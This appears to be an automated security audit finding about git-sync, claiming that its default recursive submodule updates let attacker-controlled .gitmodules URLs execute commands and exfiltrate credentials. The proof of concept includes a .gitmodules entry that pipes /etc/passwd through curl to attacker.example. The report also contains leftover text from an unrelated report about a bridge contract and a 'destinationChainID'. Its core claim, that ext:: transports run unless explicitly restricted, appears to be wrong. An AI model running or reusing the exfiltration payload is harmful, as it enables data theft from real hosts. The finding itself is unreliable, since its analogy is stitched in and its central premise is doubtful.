### Title
Unrestricted Git Submodule Protocol/URL Allows Remote Code Execution and Credential Exfiltration via Attacker-Controlled Repository Content - (File: main.go)

### Summary
`git-sync` recursively initializes and updates git submodules (`git submodule update --init [--recursive]`) whenever `--submodules` is not set to `off` (the default is `recursive`), and never restricts which transport protocols or URLs those submodules may use. This is the direct analog of the reported "lack of whitelisting" bug: just as the bridge contract accepted any `destinationChainID` without validating it against an allow-list, git-sync accepts and executes submodule configuration (`url = ...` in `.gitmodules`) from the untrusted upstream repository without any protocol or URL whitelist (no `GIT_ALLOW_PROTOCOL`, no `protocol.*.allow` restriction, no submodule-URL validation is set anywhere in the codebase).

### Finding Description
`configureWorktree` unconditionally runs submodule initialization/update using whatever content is present in the fetched tree, driven entirely by `git.submodules`: [1](#0-0) 

The submodule URLs come from `.gitmodules`, which is ordinary, attacker-controlled file content inside the synced repository — nothing in git-sync sanitizes or restricts them. Because `--submodules` defaults to `"recursive"`: [2](#0-1) 

Git itself supports multiple submodule URL transports beyond `https/ssh`, including `file://` (arbitrary local-filesystem clone, historically used to escape sandboxes, CVE-2022-39253) and remote-helper style URLs (`ext::`, custom protocol helpers) that can execute arbitrary commands when cloned, unless the git client explicitly whitelists safe protocols via `GIT_ALLOW_PROTOCOL`/`protocol.allow` configuration. `git-sync` never sets any such restriction anywhere in `main.go` (confirmed by exhaustive search — no `GIT_ALLOW_PROTOCOL`, `protocol.allow`, or submodule URL validation exists in the codebase). It also never disables submodules by default (defaulting instead to `"recursive"`), meaning any attacker who can push a commit to (or otherwise control content merged into) the tracked ref of the synced repository can add/modify `.gitmodules` to point a submodule at a malicious transport.

This mirrors the original report precisely: the destination is accepted with no allow-list check, and the resulting action (fetching/executing based on that unchecked value) is performed with the full privileges/credentials of the process — here, the git-sync sidecar's execution environment and any HTTP/SSH credentials configured for it (`--credential`, `--ssh-key-file`, `--askpass-url`), since submodule cloning reuses the credential helper state configured by `StoreCredentials`: [3](#0-2) 

### Impact Explanation
An attacker who can influence the content of the tracked branch/tag/commit (e.g., a compromised or malicious contributor to the upstream repo, or any actor whose commits get merged/fast-forwarded into the ref git-sync follows) can:
- Achieve command execution on the git-sync host/container via `ext::`-style or credential-helper-abusing submodule URLs processed during `git submodule update --init --recursive`.
- Exfiltrate any credentials git-sync has configured (via `--credential`, `--askpass-url`, SSH keys) by pointing a submodule at an attacker-controlled host that captures the credential-helper handshake.
- Cause the published symlink (`--link`) to point at partially/incorrectly synced or malicious content, and/or cause persistent sync failures (denial of service) if the submodule fetch never completes.

This satisfies the "Accept only" criteria: code execution, credential/token disclosure, publishing wrong/partial content, or persistent sync denial.

### Likelihood Explanation
Likelihood is high in any deployment where `--submodules` is left at its default (`recursive`) and the synced repository accepts contributions from less-trusted parties (forks, PR-based CI, multi-tenant repos), since no explicit action beyond a normal commit/push to `.gitmodules` is required to trigger the vulnerable path — it happens automatically on the very next sync cycle.

### Recommendation
- Add an explicit allow-list for submodule transport protocols, e.g., set `GIT_ALLOW_PROTOCOL=https:ssh` (or configure `protocol.allow`/`protocol.<type>.allow=never` for `file`, `ext`, and other unneeded protocols) before invoking any `git submodule` command in `configureWorktree`.
- Consider defaulting `--submodules` to `off` rather than `recursive`, requiring an explicit opt-in.
- Optionally validate `.gitmodules` URLs against an operator-supplied allow-list of hosts/schemes before running `submodule update --init`.

### Proof of Concept
1. Attacker with push/merge access to the tracked branch adds to `.gitmodules`:
   ```
   [submodule "evil"]
       path = evil
       url = ext::sh -c "curl attacker.example/$(cat /etc/passwd|base64) # "
   ```
2. Commits and pushes; git-sync's next poll cycle fetches the new commit and, since `--submodules` defaults to `recursive`, runs: [4](#0-3) 
   which executes `git submodule update --init --recursive`, triggering the `ext::` helper and running the attacker's command with the privileges of the git-sync process.

Note: I could not find any test (`test_e2e.sh`) that exercises `ext::` or restricted-protocol submodule URLs, and there is no code path anywhere in `main.go` that sets `GIT_ALLOW_PROTOCOL` or `protocol.allow`; this absence was confirmed via repository-wide search, supporting that no whitelist exists today.

### Citations

**File:** main.go (L182-184)
```go
	flSubmodules := pflag.String("submodules",
		envString("recursive", "GITSYNC_SUBMODULES", "GIT_SYNC_SUBMODULES"),
		"git submodule behavior: one of 'recursive', 'shallow', or 'off'")
```

**File:** main.go (L1733-1747)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```

**File:** main.go (L2055-2067)
```go
// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}
```
